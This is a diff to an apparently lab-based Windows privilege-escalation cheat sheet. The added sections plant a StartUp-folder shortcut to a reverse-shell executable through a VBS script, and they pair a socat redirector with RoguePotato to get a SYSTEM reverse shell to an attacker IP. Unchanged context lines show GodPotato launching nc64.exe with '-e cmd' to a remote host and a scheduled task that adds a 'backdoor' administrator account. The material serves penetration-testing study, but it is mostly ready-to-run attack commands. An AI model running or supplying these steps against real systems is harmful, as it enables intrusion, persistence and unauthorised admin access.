@@ -218,6 +218,35 @@ Get-ScheduledTask -TaskName "XblGameSaveTask" | Format-List *
 Get-ScheduledTask | ForEach-Object { $_.Actions }
 ```
 
+## ⭐⭐Startup Apps⭐⭐
+```
+1.  Note that the BUILTIN\Users group can write files to the StartUp directory:
+accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+  RW WIN-QBA94KB3IOF\Administrator
+  RW WIN-QBA94KB3IOF\admin
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  R  Everyone
+
+2.  Run the C:\PrivEsc\CreateShortcut.vbs script
+     Will create a new shortcut to your reverse.exe executable in the StartUp directory:
+C:\Users\user\Desktop>type C:\PrivEsc\CreateShortcut.vbs
+type C:\PrivEsc\CreateShortcut.vbs
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+
+C:\Users\user\Desktop>cscript C:\PrivEsc\CreateShortcut.vbs
+
+3.   Simulate an admin logon using RDP and the credentials you previously extracted
+```
+
 ## ⭐⭐DLLs⭐⭐
 ```
 🔺List out DLLs of a given service
@@ -231,6 +260,11 @@ Get-ScheduledTask | ForEach-Object { $_.Actions }
 ./GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
 
 🔺 SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege
+# Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
+1. sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.228.177:9999
+
+# Run the RoguePotato exploit to trigger a reverse shell running with SYSTEM privileges
+2. RoguePotato.exe -r 10.8.87.140 -e "C:\PrivEsc\reverse.exe" -l 9999
 
 🔺 SeBackupPrivilege
  
@@ -253,16 +287,9 @@ Get-ScheduledTask | ForEach-Object { $_.Actions }
 2. Run elevated task
 3. schtasks /create /tn "BackdoorTask" /tr "cmd.exe /c net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add" /sc once /st 00:00 
 schtasks /run /tn "BackdoorTask"
-
-
-
-
 ```
 
 
-```
-
-```
 
 # ⭐⭐ Registry⭐⭐
 
@@ -312,7 +339,6 @@ msiexec /quiet /qn /i sample.msi
 
 ## 💠UAC Bypass💠
 
-
 UAC can have different configuration levels:
   |-----------------------------------------------------|
   | 0 -> no prompt
@@ -354,7 +380,6 @@ Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
   `----
 ```
 
-
 ### 🔹Insecure GUI Apps🔹
 
 Note that Paint is running with admin privileges,
@@ -363,47 +388,5 @@ In the open file dialog box, click in the navigation input and paste: file://c:/
 ```
 C:\Users\user\Desktop>tasklist /V | findstr mspaint.exe
 mspaint.exe                   4176 RDP-Tcp#0                  2     29,108 K Unknown         WIN-QBA94KB3IOF\admin                                   0:00:00 N/A
-```
-
-###
-
-```bash
-
-```
-
-###
-
-```bash
-
-```
-
-###
-
-```bash
-
-```
-
-###
-
-```bash
-
-```
-
-###
-
-```bash
-
-```
-
-###
-
-```bash
-
-```
-
-###
-
-```bash
-
 ```
 
